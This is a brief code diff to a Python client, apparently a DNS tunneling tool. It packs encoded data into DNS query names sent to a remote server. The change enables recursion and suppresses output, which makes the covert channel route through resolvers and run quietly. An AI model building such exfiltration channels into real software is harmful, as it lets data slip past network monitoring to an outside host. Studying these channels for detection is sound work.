@@ -47,8 +47,8 @@ class Client:
             # Craft the packet with scapy
             try:
                 request_packet = IP(dst=nameserver)/UDP()/DNS(
-                    qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="A")])
-                send(request_packet, iface='eth0')
+                    rd=1, qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="A")])
+                send(request_packet, iface='eth0', verbose=False)
             except socket.gaierror:
                 pass
             except KeyboardInterrupt:
